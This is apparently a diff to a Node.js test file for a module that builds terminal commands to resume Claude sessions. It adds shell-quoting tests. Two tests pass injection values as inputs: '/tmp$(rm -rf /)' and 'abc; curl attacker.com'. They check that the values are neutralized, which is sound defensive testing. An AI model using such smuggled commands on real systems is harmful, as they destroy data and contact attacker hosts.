@@ -1,7 +1,7 @@
 const { describe, it } = require('node:test');
 const assert = require('node:assert/strict');
 
-const { buildLaunchArgs, findBinary, TERMINALS, restoreSession } = require('./restore');
+const { buildLaunchArgs, findBinary, TERMINALS, restoreSession, shellQuote } = require('./restore');
 
 describe('TERMINALS map', () => {
   it('includes all required terminals', () => {
@@ -33,14 +33,15 @@ describe('buildLaunchArgs — Linux full-support terminals', () => {
   const sessionId = 'abc-123';
   const cwd = '/home/user/project';
 
-  it('alacritty: uses -e flag with bash -c', () => {
+  it('alacritty: uses -e flag with bash -c and shell-quoted args', () => {
     const result = buildLaunchArgs('alacritty', sessionId, cwd, 'linux');
     assert.equal(result.type, 'spawn');
     assert.equal(result.bin, 'alacritty');
     assert.equal(result.partial, false);
     assert.deepEqual(result.args.slice(0, 3), ['-e', 'bash', '-c']);
-    assert.ok(result.args[3].includes(`cd ${cwd}`));
-    assert.ok(result.args[3].includes(`claude --resume ${sessionId}`));
+    const cmd = result.args[3];
+    assert.ok(cmd.includes(shellQuote(cwd)));
+    assert.ok(cmd.includes(shellQuote(sessionId)));
   });
 
   it('ghostty: uses -e flag on Linux (not AppleScript)', () => {
@@ -57,7 +58,7 @@ describe('buildLaunchArgs — Linux full-support terminals', () => {
     assert.equal(result.bin, 'kitty');
     assert.equal(result.partial, false);
     assert.deepEqual(result.args.slice(0, 2), ['bash', '-c']);
-    assert.ok(result.args[2].includes(`claude --resume ${sessionId}`));
+    assert.ok(result.args[2].includes(shellQuote(sessionId)));
   });
 });
 
@@ -112,11 +113,34 @@ describe('buildLaunchArgs — error handling', () => {
     );
   });
 
-  it('handles cwd with spaces', () => {
+  it('handles cwd with spaces via shell quoting', () => {
     const cwd = '/home/user/my project/code';
     const result = buildLaunchArgs('alacritty', 'id', cwd, 'linux');
-    // The bash -c string should contain the path (quoting handled by bash -c)
-    assert.ok(result.args[3].includes(cwd));
+    assert.ok(result.args[3].includes(shellQuote(cwd)));
+  });
+
+  it('neutralizes shell metacharacters in cwd', () => {
+    const malicious = '/tmp$(rm -rf /)';
+    const result = buildLaunchArgs('alacritty', 'id', malicious, 'linux');
+    const cmd = result.args[3];
+    // Should be single-quoted, not bare-interpolated
+    assert.ok(cmd.includes("'/tmp$(rm -rf /)'"));
+    assert.ok(!cmd.includes('cd /tmp$('));
+  });
+
+  it('neutralizes shell metacharacters in sessionId', () => {
+    const malicious = 'abc; curl attacker.com';
+    const result = buildLaunchArgs('alacritty', malicious, '/tmp', 'linux');
+    const cmd = result.args[3];
+    assert.ok(cmd.includes("'abc; curl attacker.com'"));
+  });
+
+  it('handles sessionId with embedded single quotes', () => {
+    const tricky = "it's-a-test";
+    const result = buildLaunchArgs('alacritty', tricky, '/tmp', 'linux');
+    const cmd = result.args[3];
+    // shellQuote escapes single quotes: 'it'\''s-a-test'
+    assert.ok(cmd.includes(shellQuote(tricky)));
   });
 });
 
